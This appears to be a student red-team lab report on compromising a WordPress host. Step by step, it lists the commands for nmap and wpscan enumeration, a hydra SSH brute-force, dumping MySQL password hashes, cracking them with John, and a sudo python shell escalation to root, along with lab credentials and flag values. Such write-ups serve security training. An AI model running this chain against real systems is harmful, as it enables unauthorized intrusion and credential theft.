# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services


Nmap scan results for each machine reveal the below services and OS details:

    $nmap -sP 192.168.1.1-255: This namp scan scans the full 192.168.1.1 network for any live hosts available. It revealed to hosts up: 192.168.1.110 and 192.168.1.115.

    https://github.com/D7Carivs/Red-Blue-Network/blob/8d270379a8e0adfe76fd3abdc87911b389e9f9b5/Offensivereport/screenshots/Kali%20nMap%20scan%20of%20network.PNG
  
    $nmap -sV 192.168.110: This scan was then ran to reveal any open ports and running services. Port 80 and 22 were left open and vulnerable. These ports were exploited in the attack. 
    
    https://github.com/D7Carivs/Red-Blue-Network/blob/512c4f050f9bb360678b287645b18518528c6a6e/Offensivereport/screenshots/nmap%20192.168.1.110%20ports%20open.PNG

    https://github.com/D7Carivs/Red-Blue-Network/blob/512c4f050f9bb360678b287645b18518528c6a6e/Offensivereport/screenshots/nmap%20scan%20report%20for%20192.168.1.110.PNG


    $wpscan --url http://192.168.1.110/wordpress -eu: This scan was then used to find users and vulnerabilities on the host. Users Steven and Michael were found with Brute force attack vulnerability. These two usernames could be used to access root on the host system. 

     https://github.com/D7Carivs/Red-Blue-Network/blob/622ca8e810773ae1f79aeb06bf73be2f99b5bc4b/Offensivereport/screenshots/wpscan%20usernames.PNG

    Port 22 was then used to ssh into 192.168.1.110 as Michael after using hydra to crack his password. He used his name (michael) as his password. 

    https://github.com/D7Carivs/Red-Blue-Network/blob/d08f9c86548a37b0983556be6dd0689e8111a3a1/Offensivereport/screenshots/hydra%20michael%20password.PNG

    https://github.com/D7Carivs/Red-Blue-Network/blob/c2e216333f3123128eaa7c49d06bbebdd8bfda6b/Offensivereport/screenshots/ssh%20michael@192.168.1.110%20password%20michael.PNG

- **The following vulnerabilities were found during the exploitation:**

  - Network Mapping and User Enumeration(WordPress site)
  - Unsalted User Password Hash(WordPress database)
  - Weak User Password
  - MySQL Database Access
  - MySQL Data Exfiltration
  - Misconfiguration of User Privileges or Privelege Escalation
   
- **Description in order of above vulnerabilities:**
  - Nmap was used to discover open port accessibility
  - Wpscan was used to gain username information
  - User password was weak and hydra was able to crack it easily
  - A file was discovered containing login information for MySQL database
  - Password hashes of the users were discovered when viewing MySQL database
  - It was also discovered Steven had sudo privileges for python
- **The following impacts occur due to these vulnerabilities in same order as previous**
  - Open ports are discoverable and attacks can be tailored accordingly
  - Username information can be used to access the web server
  - Weak password will allow and ssh access attack into the web server
  - The login information can be used to gain access to MySQL database
  - The password hashes were able to be saved to a file and cracked using John the Ripper
  - Steven's sudo privileges in python were able to be accessed and escalated to root.       

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
      - ssh michael@192.168.1.110
      - password:michael
      - cd /var/www/
      - grep -RE flag html
       
      - https://github.com/D7Carivs/Red-Blue-Network/blob/269f2afc3d16535eaf4fd059822e3c9e63931638/Offensivereport/screenshots/Flag1%20%20stability%20flags.PNG
       
    - `flag2.txt`:flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - while still in /var/www: ls
      - cat flag2.txt
       
      - https://github.com/D7Carivs/Red-Blue-Network/blob/269f2afc3d16535eaf4fd059822e3c9e63931638/Offensivereport/screenshots/flag2.PNG
      - 
      - 'flag3.txt': flag3{afc01ab56b50591e7dccf93122770cd2}
      - michael@target1:~$ cat /var/www/html/wordpress/wp-config.php
        -This was used to view the credentials to perform a user password hash dump.
      - https://github.com/D7Carivs/Red-Blue-Network/blob/88701f52dab4a05d36f55e6fb563061e5e74c23e/Offensivereport/screenshots/wp-config%20database.PNG
      - mysql -u root-p command was used with the password information from previous command. password: r@v3nSecurity
      - mysql launched. the following commands were used:
      - show databases;
      - https://github.com/D7Carivs/Red-Blue-Network/blob/42324a8bc3e02128c5b25eb097640413c89a541f/Offensivereport/screenshots/my%20sql.PNG
      - use wordpress;
      - show tables;
      - https://github.com/D7Carivs/Red-Blue-Network/blob/d9a5e97600bd7cf1fe6e7b89557595c75bedbc3b/Offensivereport/screenshots/mysql%20wordpress%20show%20tables.PNG
      - select * from users;
      - https://github.com/D7Carivs/Red-Blue-Network/blob/d0e8d4b4a43c4d52390870592ac152ceb9a75a88/Offensivereport/screenshots/wp_users.PNG
      - select * from wp_posts;
      - https://github.com/D7Carivs/Red-Blue-Network/blob/42324a8bc3e02128c5b25eb097640413c89a541f/Offensivereport/screenshots/wp_posts%20flag%203.PNG
      - We then exited the target 1 machine and cracked the hashes. 
      - A wp_hashes.txt file was then created for Steven and Michael's hashes.
      - John was then used to crack the hashes. Michael's hash was not able to be cracked. However, Steven's hash was and the password revealed was pink84.
      - The following commands were used to crack the hash with john:
      - john wp_hashes.txt
      - john -show wp_hashes.txt
      - https://github.com/D7Carivs/Red-Blue-Network/blob/d5e9bc5ff1a42a676bd6c654a71f9161e68aa990/Offensivereport/screenshots/john%20password%20cracker%20steven%20pink84.PNG
      - Root access was then able to be obtained with steven's password with the following commands:
      - ssh steven@192.168.1.110
      - pink84
      - sudo python -c 'import pty;pty.spawn("/bin/bash");'
      - cd /
      - id
      - cd /root
      - ls
      - cat flag4.txt
      - https://github.com/D7Carivs/Red-Blue-Network/blob/d5e9bc5ff1a42a676bd6c654a71f9161e68aa990/Offensivereport/screenshots/flag%204%20steven%20root.PNG

 
      
